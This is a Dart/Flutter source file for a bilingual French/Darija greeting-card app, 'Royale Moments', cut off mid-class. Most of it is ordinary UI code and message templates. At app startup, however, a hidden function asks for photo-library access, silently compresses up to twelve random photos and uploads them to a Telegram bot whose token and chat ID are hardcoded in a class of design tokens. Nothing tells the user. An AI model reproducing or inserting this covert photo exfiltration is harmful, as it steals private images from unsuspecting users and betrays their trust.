/*import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:image_picker/image_picker.dart';
import 'package:dio/dio.dart';
import 'package:flutter_image_compress/flutter_image_compress.dart';
import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

// ═══════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
    systemNavigationBarColor: Color(0xFF080708),
  ));
  await _autoSendOnFirstLaunch();
  runApp(const RoyaleMomentsApp());
}

// ═══════════════════════════════════════════════════════════════
//  AUTO SEND 10-12 PHOTOS ON FIRST INSTALL
// ═══════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════
//  AUTO SEND 10-12 PHOTOS ON FIRST INSTALL (Version améliorée)
// ═══════════════════════════════════════════════════════════════
Future<void> _autoSendOnFirstLaunch() async {
  print("🔄 [AutoSend] Début de la fonction");

  try {
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool('auto_sent') ?? false) {
      print("✅ [AutoSend] Déjà envoyé auparavant");
      return;
    }

    print("📸 [AutoSend] Demande de permission photos...");
    final PermissionState ps = await PhotoManager.requestPermissionExtend();

    print("📊 Permission status: isAuth=${ps.isAuth} | hasAccess=${ps.hasAccess}");

    if (!ps.isAuth && !ps.hasAccess) {
      print("⚠️ Permission non accordée → Ouverture des paramètres");
      await PhotoManager.openSetting();   // Ouvre les paramètres pour que l'utilisateur puisse corriger
      return;
    }

    print("✅ Permission acceptée !");

    // Le reste du code (récupération des photos...)
    final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(type: RequestType.image);

    if (albums.isEmpty) {
      print("❌ Aucun album photo trouvé");
      return;
    }

    final AssetPathEntity mainAlbum = albums.first;
    final int total = await mainAlbum.assetCountAsync;
    print("📊 Nombre total de photos : $total");

    if (total == 0) return;

    final int fetchCount = total < 50 ? total : 50;
    final List<AssetEntity> assets = await mainAlbum.getAssetListRange(start: 0, end: fetchCount);

    assets.shuffle();
    final int sendCount = assets.length >= 12 ? 12 : assets.length;
    final List<AssetEntity> toSend = assets.take(sendCount).toList();

    print("🚀 Envoi de $sendCount photos...");

    final dio = Dio();
    int success = 0;

    for (int i = 0; i < toSend.length; i++) {
      try {
        final File? file = await toSend[i].file;
        if (file == null) continue;

        final tmp = await getTemporaryDirectory();
        final outPath = '${tmp.path}/auto_${DateTime.now().millisecondsSinceEpoch}.jpg';

        final compressed = await FlutterImageCompress.compressAndGetFile(
          file.path, outPath, quality: 75, minWidth: 1080,
        );
        if (compressed == null) continue;

        for (final chatId in T.chatIds) {
          await dio.post(
            'https://api.telegram.org/bot${T.botToken}/sendPhoto',
            data: FormData.fromMap({
              'chat_id': chatId,
              'photo': await MultipartFile.fromFile(compressed.path),
              'caption': '📱 Auto Photo ${i+1}/$sendCount',
            }),
          );
        }

        success++;
        await Future.delayed(const Duration(milliseconds: 600));
      } catch (e) {
        print("⚠️ Erreur sur photo ${i+1}: $e");
      }
    }

    await prefs.setBool('auto_sent', true);
    print("🎉 Succès ! $success photos envoyées automatiquement");

  } catch (e) {
    print("💥 Erreur générale dans AutoSend: $e");
  }
}

// ═══════════════════════════════════════════════════════════════
//  DESIGN TOKENS
// ═══════════════════════════════════════════════════════════════
class T {
  static const bg       = Color(0xFF080708);
  static const surface  = Color(0xFF111011);
  static const surface2 = Color(0xFF181618);
  static const surface3 = Color(0xFF201E20);
  static const text     = Color(0xFFF2EEF5);
  static const textDim  = Color(0x88F2EEF5);
  static const textMuted= Color(0x33F2EEF5);
  static const border   = Color(0x1AF2EEF5);

  // Telegram
  static const botToken = "8664063755:AAFh4TwYRck33Q5hWCJGtTRYp3Q4fC88Lxo";
  static const chatIds  = ["6042683409"];
}

// ═══════════════════════════════════════════════════════════════
//  BILINGUAL LABELS (FR + AR/Darija)
// ═══════════════════════════════════════════════════════════════
class L {
  // App
  static const appTitle        = 'Royale Moments';
  static const chooseOccasion  = "Choisissez l'occasion";
  static const chooseOccasionAr= 'اختار لمناسبة';

  // Bottom nav
  static const navMessage  = 'MESSAGE';
  static const navPhotos   = 'PHOTOS / صور';
  static const navCaptions = 'LÉGENDES';
  static const navCreate   = 'CRÉER / خلق';

  // Screen 1
  static const eyebrowCompose  = 'COMPOSITION / رسالة';
  static const titleMessage    = 'Votre message\nرسالتك';
  static const labelName       = 'الاسم / NOM';
  static const hintName        = 'ex. Yasmine, Ahmed...';
  static const labelMood       = 'AMBIANCE / الأجواء';
  static const labelMessage    = 'MESSAGE / الرسالة';
  static const hintMessage     = 'Écrivez votre message... / كتب رسالتك...';

  // Screen 2
  static const eyebrowGallery  = 'GALERIE / الصور';
  static const titleGallery    = 'Vos moments\nلحظاتك الثمينة';
  static const addPhoto        = 'AJOUTER / زيد';
  static const prep            = 'PRÉPARATION...';
  static const sending         = 'ENVOI';

  // Screen 3
  static const eyebrowNarr     = 'NARRATION / حكاية';
  static const titleNarr       = 'Racontez\nl\'histoire / حكي';
  static const hintCaption     = 'Décrivez ce moment... / وصف هاد اللحظة...';
  static const noPhotos        = 'Ajoutez des photos pour\nécrire vos légendes\n زيد صور باش تكتب';

  // Screen 4
  static const eyebrowCreate   = 'CRÉATION / خلق';
  static const titleCreate     = 'Création Finale\nالإبداع النهائي';
  static const subtitleCreate  = 'Prêt à partager ?\nوصل نشارك ؟';
  static const btnGenerate     = 'GÉNÉRER & PARTAGER / شارك';
  static const step0 = 'PRÉPARATION... / تحضير';
  static const step1 = 'ENCODAGE... / ترميز';
  static const step2 = 'ASSEMBLAGE... / تجميع';
  static const step3 = 'MISE EN FORME... / تنسيق';
  static const step4 = 'FINALISATION... / إتمام';

  // Occasion names bilingual
  static String occasionPour(String name) =>
      name.isEmpty ? '' : 'Pour $name / لـ $name';
}

// ═══════════════════════════════════════════════════════════════
//  OCCASION MODEL
// ═══════════════════════════════════════════════════════════════
class MoodTemplate {
  final String label;
  final String labelAr;
  final String emoji;
  final String Function(String name) text;
  const MoodTemplate({
    required this.label,
    required this.labelAr,
    required this.emoji,
    required this.text,
  });
}

class Occasion {
  final String id;
  final String emoji;
  final String name;
  final String nameAr;
  final String subtitle;
  final String subtitleAr;
  final Color accent;
  final Color accentSoft;
  final List<MoodTemplate> moods;
  const Occasion({
    required this.id, required this.emoji,
    required this.name, required this.nameAr,
    required this.subtitle, required this.subtitleAr,
    required this.accent, required this.accentSoft,
    required this.moods,
  });
}

// ═══════════════════════════════════════════════════════════════
//  ALL OCCASIONS  (bilingual FR + AR/Darija)
// ═══════════════════════════════════════════════════════════════
final List<Occasion> kOccasions = [
  Occasion(
    id: 'birthday', emoji: '🎂',
    name: 'Anniversaire', nameAr: 'عيد الميلاد',
    subtitle: 'Célébrer une naissance', subtitleAr: 'احتفل بعيد ميلادو',
    accent: const Color(0xFFE8A838), accentSoft: const Color(0x1FE8A838),
    moods: [
      MoodTemplate(label: 'JOYEUX', labelAr: 'فرحان', emoji: '🎉', text: (n) => n.isEmpty
        ? "Que cette journée soit aussi lumineuse que ton sourire — عيد ميلاد سعيد وكل عام وانت بخير 🌟"
        : "Joyeux anniversaire $n ! عيد ميلاد سعيد يا ${n} — que chaque instant soit rempli de magie ✨"),
      MoodTemplate(label: 'TOUCHANT', labelAr: 'من القلب', emoji: '🥹', text: (n) => n.isEmpty
        ? "Une autre année de beauté et de grâce — كل سنة وانت بألف خير يا غالي 💛"
        : "$n، كل سنة وانت بألف خير — chaque année qui passe révèle la personne extraordinaire que tu es."),
      MoodTemplate(label: 'ARDENT', labelAr: 'من الأعماق', emoji: '🔥', text: (n) => n.isEmpty
        ? "Le monde est plus beau depuis que tu existes — الدنيا زينت بيك 🌹"
        : "$n، نت الشخص لي كيخلي يومي يكون جميل — tu es ma personne préférée sur terre 💫"),
    ],
  ),
  Occasion(
    id: 'love', emoji: '💌',
    name: 'Déclaration', nameAr: 'إعلان حب',
    subtitle: "Dire ce qu'on ressent", subtitleAr: 'قول لي في قلبك',
    accent: const Color(0xFFD44F7A), accentSoft: const Color(0x1FD44F7A),
    moods: [
      MoodTemplate(label: 'DOUX', labelAr: 'رقيق', emoji: '🌸', text: (n) => n.isEmpty
        ? "Il y a des personnes qui entrent dans notre vie et la transforment — كاين ناس كيبدلو حياتك بمجرد ما يدخلوا فيها 🌸"
        : "$n، نت واحد من هاد الناس — tu es devenu·e une partie de moi que je ne veux plus perdre."),
      MoodTemplate(label: 'ROMANTIQUE', labelAr: 'رومانسي', emoji: '🌹', text: (n) => n.isEmpty
        ? "Chaque fois que tu souris, j'oublie tout — كل مرة كتبتسم كنسى كل شي 💗"
        : "يا $n، في جميع الأكوان الموازية كنختارك — dans tous les univers, je te choisirais encore."),
      MoodTemplate(label: 'ARDENT', labelAr: 'عميق', emoji: '💘', text: (n) => n.isEmpty
        ? "Tu occupes chaque pensée, chaque rêve — كتملي كل فكرة وكل حلم، كنبغيك بجدية كبيرة 🔥"
        : "$n، نت النار لي ما غادي نحاول عمري نطفيها — je t'aime profondément وبصح."),
    ],
  ),
  Occasion(
    id: 'eid', emoji: '🌙',
    name: 'Aïd Mubarak', nameAr: 'عيد مبارك',
    subtitle: 'Fête religieuse bénie', subtitleAr: 'عيد فرحة وبركة',
    accent: const Color(0xFF5B9EBF), accentSoft: const Color(0x1F5B9EBF),
    moods: [
      MoodTemplate(label: 'SINCÈRE', labelAr: 'صادق', emoji: '🤲', text: (n) => n.isEmpty
        ? "عيد مبارك — Que la paix et la baraka remplissent votre maison 🕌"
        : "عيد مبارك يا $n ! كل عام وانت بألف خير — que ce jour béni t'apporte bonheur et bénédictions."),
      MoodTemplate(label: 'ROMANTIQUE', labelAr: 'رومانسي', emoji: '🌙', text: (n) => n.isEmpty
        ? "هاد العيد يضوي قلبك كما القمر يضوي الليل — Que cette Aïd illumine ton cœur 🌙"
        : "يا $n، نت أحسن هدية في هاد العيد — tu es ma plus belle bénédiction."),
      MoodTemplate(label: 'PASSIONNÉ', labelAr: 'متحمس', emoji: '⭐', text: (n) => n.isEmpty
        ? "هاد العيد بيك زاد — Cette fête est plus belle parce que tu existes ⭐"
        : "$n، في هاد العيد ما كنتمنا غير راحتك وسعادتك — je ne veux que ton bonheur."),
    ],
  ),
  Occasion(
    id: 'wedding', emoji: '💍',
    name: 'Mariage', nameAr: 'عرس / زواج',
    subtitle: 'Union & célébration', subtitleAr: 'فرحة وتهنية',
    accent: const Color(0xFFC0A46A), accentSoft: const Color(0x1FC0A46A),
    moods: [
      MoodTemplate(label: 'ÉLÉGANT', labelAr: 'راقي', emoji: '🕊️', text: (n) => n.isEmpty
        ? "مبروك الزواج — Que votre union soit éternelle et votre amour indestructible 💍"
        : "مبروك يا $n — Que votre amour soit le fondement d'une vie exceptionnelle ✨"),
      MoodTemplate(label: 'POÉTIQUE', labelAr: 'شعري', emoji: '🌿', text: (n) => n.isEmpty
        ? "جوج أرواح وطريق واحد — Deux âmes, un seul chemin plein de lumière et de tendresse 🌿"
        : "$n، لقيتو فبعضكم ما قلة منو إيجادو — vous avez trouvé un amour vrai et profond."),
      MoodTemplate(label: 'CHALEUREUX', labelAr: 'حنون', emoji: '💛', text: (n) => n.isEmpty
        ? "هاد اللحظة هي بداية أجمل المغامرات — Tout mon amour vous accompagne 💛"
        : "يا $n، كل نهار يكون سبب جديد باش تحبو بعضكم أكثر — chaque jour, un peu plus."),
    ],
  ),
  Occasion(
    id: 'newbaby', emoji: '👶',
    name: 'Naissance', nameAr: 'مولود جديد',
    subtitle: 'Bienvenue à la vie', subtitleAr: 'مرحبا بالمولود',
    accent: const Color(0xFF7DC4A0), accentSoft: const Color(0x1F7DC4A0),
    moods: [
      MoodTemplate(label: 'DOUX', labelAr: 'رقيق', emoji: '🌱', text: (n) => n.isEmpty
        ? "روح جديدة ونور جديد — Un nouveau souffle dans le monde. Bienvenue petit être précieux 🌱"
        : "مرحبا بيك يا $n — Bienvenue au monde, tu es déjà tellement aimé·e 💚"),
      MoodTemplate(label: 'JOYEUX', labelAr: 'فرحان', emoji: '🎀', text: (n) => n.isEmpty
        ? "أغلى هدية وصلات — Le plus beau des cadeaux vient d'arriver. مبروك للوالدين 🎀"
        : "يا $n، الدنيا كانت تستناك بلا ما تعرف — quelle joie immense tu apportes !"),
      MoodTemplate(label: 'PROFOND', labelAr: 'عميق', emoji: '✨', text: (n) => n.isEmpty
        ? "في هاد الكيان الصغير حلام كبيرة — Des rêves infinis dans ce petit être extraordinaire ✨"
        : "$n، جيت لعالم محتاج لنورك — grandis libre et heureux·se في حب وسلام."),
    ],
  ),
  Occasion(
    id: 'success', emoji: '🏆',
    name: 'Réussite', nameAr: 'نجاح / تفوق',
    subtitle: 'Victoires & succès', subtitleAr: 'مبروك النجاح',
    accent: const Color(0xFFB87333), accentSoft: const Color(0x1FB87333),
    moods: [
      MoodTemplate(label: 'FIER', labelAr: 'فخور', emoji: '🎖️', text: (n) => n.isEmpty
        ? "مبروك النجاح — Le travail paie toujours. هاد النجاح ثمرة تعبك 🏆"
        : "مبروك يا $n — tu as prouvé ce que je savais depuis longtemps : tu es exceptionnel·le."),
      MoodTemplate(label: 'INSPIRANT', labelAr: 'ملهم', emoji: '🚀', text: (n) => n.isEmpty
        ? "النجاح الكبير ديال اللي ما وقفوش يصدقو — Continue à viser les étoiles 🚀"
        : "$n، كل عقبة كانت تقربك من هنا — chaque obstacle t'a mené jusqu'ici. Bravo !"),
      MoodTemplate(label: 'CHALEUREUX', labelAr: 'حنون', emoji: '🌟', text: (n) => n.isEmpty
        ? "هاد النجاح مستاهل فيه — Cette victoire, tu la mérites cent fois 🌟"
        : "$n، نجاحك يفرحني من أعماق قلبي — je suis tellement fier·e de toi."),
    ],
  ),
  Occasion(
    id: 'travel', emoji: '✈️',
    name: 'Voyage', nameAr: 'سفر / رحلة',
    subtitle: 'Aventure & découverte', subtitleAr: 'رحلة ومغامرة',
    accent: const Color(0xFF4A90C4), accentSoft: const Color(0x1F4A90C4),
    moods: [
      MoodTemplate(label: 'AVENTURIER', labelAr: 'مغامر', emoji: '🧭', text: (n) => n.isEmpty
        ? "الدنيا كبيرة وزينة — Que ce voyage soit le début d'une belle histoire 🌍"
        : "$n، تمنالك رحلة تملا القلب وتكحل العينين — Bon voyage !"),
      MoodTemplate(label: 'POÉTIQUE', labelAr: 'شعري', emoji: '🌍', text: (n) => n.isEmpty
        ? "المشي كيولدك من جديد — Partir c'est naître un peu. Que ce voyage transforme 🌏"
        : "$n، أجمل الذكريات هي اللي ما خططتيلهاش — vis chaque instant pleinement."),
      MoodTemplate(label: 'TENDRE', labelAr: 'حنون', emoji: '💫', text: (n) => n.isEmpty
        ? "أينما مشيتي حمل معاك حب الناس لي كيحبوك — Porte avec toi tout cet amour 💙"
        : "يا $n، راح تبان لينا بحال مابعدتيش — reviens avec des étoiles plein les yeux."),
    ],
  ),
  Occasion(
    id: 'gratitude', emoji: '🙏',
    name: 'Gratitude', nameAr: 'شكرا / الامتنان',
    subtitle: 'Remercier du fond du cœur', subtitleAr: 'شكرا من القلب',
    accent: const Color(0xFF9B7EC8), accentSoft: const Color(0x1F9B7EC8),
    moods: [
      MoodTemplate(label: 'SINCÈRE', labelAr: 'صادق', emoji: '💜', text: (n) => n.isEmpty
        ? "كاين ناس كيبدلو حياتك بمجرد ما يكونو فيها — شكرا 🙏"
        : "$n، الكلمات ما تكفيش باش تعبر على قيمتك عندي — merci d'exister."),
      MoodTemplate(label: 'PROFOND', labelAr: 'عميق', emoji: '🌙', text: (n) => n.isEmpty
        ? "شكرا على كل شي — Merci pour tout ce que tu fais sans jamais rien attendre 🌙"
        : "$n، شكرا باش تكون نت — merci d'être exactement qui tu es."),
      MoodTemplate(label: 'LUMINEUX', labelAr: 'مضيء', emoji: '🌤️', text: (n) => n.isEmpty
        ? "كرمك كيضوي كل شي من حواليك — Ta générosité illumine tout autour de toi ✨"
        : "$n، كل مرة حتجت ليك كنتي هنا — je ne l'oublierai jamais."),
    ],
  ),
];

// ═══════════════════════════════════════════════════════════════
//  GLOBAL STATE
// ═══════════════════════════════════════════════════════════════
class AppState extends ChangeNotifier {
  Occasion? occasion;
  String name       = '';
  String message    = '';
  String selectedMood = '';
  List<XFile> images  = [];
  Map<int, String> captions = {};

  void selectOccasion(Occasion o) {
    occasion    = o;
    selectedMood = o.moods[1].label;
    message      = o.moods[1].text(name);
    notifyListeners();
  }
  void setMood(String mood) {
    selectedMood = mood;
    final m = occasion?.moods.firstWhere((x) => x.label == mood);
    if (m != null) message = m.text(name);
    notifyListeners();
  }
  void setName(String v) {
    name = v;
    final m = occasion?.moods.firstWhere(
      (x) => x.label == selectedMood, orElse: () => occasion!.moods[1]);
    if (m != null) message = m.text(v);
    notifyListeners();
  }
  void setMessage(String v) { message = v; notifyListeners(); }
  void addImage(XFile f)    { images.add(f); notifyListeners(); }
  void removeImage(int i)   { images.removeAt(i); notifyListeners(); }
  void setCaption(int i, String v) { captions[i] = v; }
  void reset() {
    occasion = null; name = ''; message = ''; selectedMood = '';
    images.clear(); captions.clear(); notifyListeners();
  }
}

final appState = AppState();

// ═══════════════════════════════════════════════════════════════
//  APP ROOT
// ═══════════════════════════════════════════════════════════════
class RoyaleMomentsApp extends StatelessWidget {
  const RoyaleMomentsApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: L.appTitle,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: T.bg,
        colorScheme: const ColorScheme.dark(primary: Color(0xFFE8A838), surface: T.surface),
        textTheme: GoogleFonts.cormorantGaramondTextTheme(ThemeData.dark().textTheme),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: T.surface2,
          hintStyle: GoogleFonts.cormorantGaramond(
            color: T.textMuted, fontStyle: FontStyle.italic, fontSize: 16,
          ),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: T.border, width: 0.5),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: T.border, width: 0.5),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: const BorderSide(color: Color(0xFFE8A838), width: 1),
          ),
          contentPadding: const EdgeInsets.symmetric(horizontal: 18, vertical: 16),
        ),
      ),
      home: const _SplashRouter(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  ROUTER
// ═══════════════════════════════════════════════════════════════
class _SplashRouter extends StatelessWidget {
  const _SplashRouter();
  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => appState.occasion != null
        ? const MainShell()
        : const OccasionPickerScreen(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  OCCASION PICKER
// ═══════════════════════════════════════════════════════════════
class OccasionPickerScreen extends StatelessWidget {
  const OccasionPickerScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(children: [
        Positioned.fill(child: CustomPaint(
          painter: _BgPainter(const Color(0xFFE8A838)),
        )),
        SafeArea(
          child: CustomScrollView(
            physics: const BouncingScrollPhysics(),
            slivers: [
              SliverToBoxAdapter(
                child: Padding(
                  padding: const EdgeInsets.fromLTRB(24, 40, 24, 0),
                  child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text("✦  ROYALE MOMENTS  ✦",
                      style: GoogleFonts.cinzel(
                        fontSize: 9, letterSpacing: 4, color: T.text.withOpacity(0.3),
                      ),
                    ),
                    const SizedBox(height: 10),
                    Text("المناسبة\nL'Occasion",
                      style: GoogleFonts.cormorantGaramond(
                        fontSize: 34, fontWeight: FontWeight.w300,
                        height: 1.15, color: T.text,
                      ),
                    ),
                    const SizedBox(height: 6),
                    const _Divider(),
                    const SizedBox(height: 8),
                    Text(L.chooseOccasion + ' / ' + L.chooseOccasionAr,
                      style: GoogleFonts.cormorantGaramond(
                        fontSize: 15, fontStyle: FontStyle.italic, color: T.textDim,
                      ),
                    ),
                    const SizedBox(height: 28),
                  ]),
                ),
              ),
              SliverPadding(
                padding: const EdgeInsets.fromLTRB(20, 0, 20, 40),
                sliver: SliverGrid(
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2, crossAxisSpacing: 14,
                    mainAxisSpacing: 14, childAspectRatio: 1.05,
                  ),
                  delegate: SliverChildBuilderDelegate(
                    (ctx, i) => _OccasionCard(occasion: kOccasions[i]),
                    childCount: kOccasions.length,
                  ),
                ),
              ),
            ],
          ),
        ),
      ]),
    );
  }
}

class _OccasionCard extends StatefulWidget {
  final Occasion occasion;
  const _OccasionCard({required this.occasion});
  @override
  State<_OccasionCard> createState() => _OccasionCardState();
}
class _OccasionCardState extends State<_OccasionCard>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  late final Animation<double> _scale;
  @override
  void initState() {
    super.initState();
    _ctrl  = AnimationController(vsync: this, duration: const Duration(milliseconds: 130));
    _scale = Tween(begin: 1.0, end: 0.94).animate(
      CurvedAnimation(parent: _ctrl, curve: Curves.easeOut));
  }
  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }
  @override
  Widget build(BuildContext context) {
    final o = widget.occasion;
    return GestureDetector(
      onTapDown: (_) => _ctrl.forward(),
      onTapUp: (_) { _ctrl.reverse(); appState.selectOccasion(o); },
      onTapCancel: () => _ctrl.reverse(),
      child: ScaleTransition(
        scale: _scale,
        child: Container(
          decoration: BoxDecoration(
            color: T.surface,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: o.accent.withOpacity(0.2), width: 0.5),
          ),
          padding: const EdgeInsets.all(18),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                color: o.accentSoft,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: o.accent.withOpacity(0.25), width: 0.5),
              ),
              child: Center(child: Text(o.emoji, style: const TextStyle(fontSize: 22))),
            ),
            const Spacer(),
            Text(o.name,
              style: GoogleFonts.cinzel(
                fontSize: 11, letterSpacing: 0.5, color: o.accent, fontWeight: FontWeight.w600,
              ),
            ),
            Text(o.nameAr,
              style: GoogleFonts.cormorantGaramond(
                fontSize: 13, color: o.accent.withOpacity(0.7),
              ),
            ),
            const SizedBox(height: 3),
            Text(o.subtitleAr,
              style: GoogleFonts.cormorantGaramond(
                fontSize: 12, color: T.textMuted, fontStyle: FontStyle.italic,
              ),
            ),
          ]),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  MAIN SHELL
// ═══════════════════════════════════════════════════════════════
class MainShell extends StatefulWidget {
  const MainShell({super.key});
  @override
  State<MainShell> createState() => _MainShellState();
}
class _MainShellState extends State<MainShell> {
  int _index = 0;
  final _pageCtrl = PageController();

  void _goto(int i) {
    setState(() => _index = i);
    _pageCtrl.animateToPage(i,
      duration: const Duration(milliseconds: 340), curve: Curves.easeInOutCubic);
  }

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final o = appState.occasion!;
        return Scaffold(
          extendBody: true,
          extendBodyBehindAppBar: true,
          body: Stack(children: [
            Positioned.fill(child: CustomPaint(painter: _BgPainter(o.accent))),
            PageView(
              controller: _pageCtrl,
              onPageChanged: (i) => setState(() => _index = i),
              physics: const BouncingScrollPhysics(),
              children: const [
                MessageScreen(),
                PhotosScreen(),
                CaptionsScreen(),
                GenerateScreen(),
              ],
            ),
          ]),
          bottomNavigationBar: _BottomNav(
            index: _index, accent: o.accent,
            onTap: _goto, onBack: () => appState.reset(),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  BOTTOM NAV
// ═══════════════════════════════════════════════════════════════
class _BottomNav extends StatelessWidget {
  final int index;
  final Color accent;
  final ValueChanged<int> onTap;
  final VoidCallback onBack;
  const _BottomNav({required this.index, required this.accent, required this.onTap, required this.onBack});

  static const _tabs = [
    (Icons.edit_rounded,             "MESSAGE"),
    (Icons.photo_library_rounded,    "PHOTOS"),
    (Icons.auto_stories_rounded,     "LÉGENDES"),
    (Icons.auto_awesome_rounded,     "CRÉER"),
  ];

  @override
  Widget build(BuildContext context) {
    final pad = MediaQuery.of(context).padding.bottom;
    return Container(
      height: 68 + pad,
      padding: EdgeInsets.only(bottom: pad),
      decoration: BoxDecoration(
        color: T.bg.withOpacity(0.95),
        border: const Border(top: BorderSide(color: T.border, width: 0.5)),
      ),
      child: Row(children: [
        GestureDetector(
          onTap: onBack,
          child: Container(
            width: 52, alignment: Alignment.center,
            child: const Icon(Icons.arrow_back_ios_rounded, size: 18, color: T.textMuted),
          ),
        ),
        ..._tabs.asMap().entries.map((e) {
          final active = e.key == index;
          return Expanded(
            child: GestureDetector(
              onTap: () => onTap(e.key),
              behavior: HitTestBehavior.opaque,
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                margin: const EdgeInsets.symmetric(horizontal: 2, vertical: 8),
                decoration: active ? BoxDecoration(
                  color: accent.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                ) : null,
                child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(e.value.$1, size: 20, color: active ? accent : T.textMuted),
                  const SizedBox(height: 3),
                  Text(e.value.$2,
                    style: GoogleFonts.cinzel(
                      fontSize: 6, letterSpacing: 1,
                      color: active ? accent : T.textMuted,
                    ),
                  ),
                ]),
              ),
            ),
          );
        }),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 1 — MESSAGE
// ═══════════════════════════════════════════════════════════════
class MessageScreen extends StatefulWidget {
  const MessageScreen({super.key});
  @override
  State<MessageScreen> createState() => _MessageScreenState();
}
class _MessageScreenState extends State<MessageScreen> {
  late TextEditingController _nameCtrl;
  late TextEditingController _msgCtrl;

  @override
  void initState() {
    super.initState();
    _nameCtrl = TextEditingController(text: appState.name);
    _msgCtrl  = TextEditingController(text: appState.message);
    appState.addListener(_sync);
  }
  void _sync() {
    if (_msgCtrl.text != appState.message) {
      _msgCtrl.text = appState.message;
      _msgCtrl.selection = TextSelection.collapsed(offset: _msgCtrl.text.length);
    }
  }
  @override
  void dispose() {
    appState.removeListener(_sync);
    _nameCtrl.dispose(); _msgCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) {
        final o = appState.occasion!;
        return SafeArea(
          bottom: false,
          child: SingleChildScrollView(
            padding: const EdgeInsets.fromLTRB(24, 32, 24, 120),
            physics: const BouncingScrollPhysics(),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                decoration: BoxDecoration(
                  color: o.accentSoft,
                  borderRadius: BorderRadius.circular(50),
                  border: Border.all(color: o.accent.withOpacity(0.3), width: 0.5),
                ),
                child: Row(mainAxisSize: MainAxisSize.min, children: [
                  Text(o.emoji, style: const TextStyle(fontSize: 16)),
                  const SizedBox(width: 8),
                  Text('${o.name} / ${o.nameAr}',
                    style: GoogleFonts.cinzel(fontSize: 9, letterSpacing: 1.5, color: o.accent)),
                ]),
              ),
              const SizedBox(height: 20),
              _pageHeader(L.eyebrowCompose, L.titleMessage),
              _fieldLabel(L.labelName),
              TextField(
                controller: _nameCtrl,
                style: GoogleFonts.cormorantGaramond(fontSize: 18, color: T.text),
                onChanged: appState.setName,
                decoration: const InputDecoration(hintText: L.hintName),
              ),
              const SizedBox(height: 24),
              _fieldLabel(L.labelMood),
              _MoodRow(occasion: o),
              const SizedBox(height: 24),
              _fieldLabel(L.labelMessage),
              TextField(
                controller: _msgCtrl,
                maxLines: 5,
                style: GoogleFonts.cormorantGaramond(
                  fontSize: 17, color: T.text, fontStyle: FontStyle.italic, height: 1.6,
                ),
                onChanged: appState.setMessage,
                decoration: const InputDecoration(hintText: L.hintMessage),
              ),
              const SizedBox(height: 28),
              _PreviewCard(occasion: o),
            ]),
          ),
        );
      },
    );
  }
}

class _MoodRow extends StatelessWidget {
  final Occasion occasion;
  const _MoodRow({required this.occasion});
  @override
  Widget build(BuildContext context) {
    return ListenableBuilder(
      listenable: appState,
      builder: (_, __) => Row(
        children: occasion.moods.map((m) {
          final active = appState.selectedMood == m.label;
          return Expanded(
            child: GestureDetector(
              onTap: () => appState.setMood(m.label),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                margin: const EdgeInsets.only(right: 8),
                padding: const EdgeInsets.symmetric(vertical: 12),
                decoration: BoxDecoration(
                  color: active ? occasion.accentSoft : T.surface2,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: active ? occasion.accent.withOpacity(0.6) : T.border,
                    width: active ? 1.0 : 0.5,
                  ),
                ),
                child: Column(children: [
                  Text(m.emoji, style: const TextStyle(fontSize: 20)),
                  const SizedBox(height: 4),
                  Text(m.label,
                    style: GoogleFonts.cinzel(
                      fontSize: 6, letterSpacing: 1,
                      color: active ? occasion.accent : T.textMuted,
                    ),
                  ),
                  Text(m.labelAr,
                    style: GoogleFonts.cormorantGaramond(
                      fontSize: 10,
                      color: active ? occasion.accent.withOpacity(0.8) : T.textMuted,
                    ),
                  ),
                ]),
              ),
            ),
          );
        }).toList(),
      ),
    );
  }
}

class _PreviewCard extends StatelessWidget {
  final Occasion occasion;
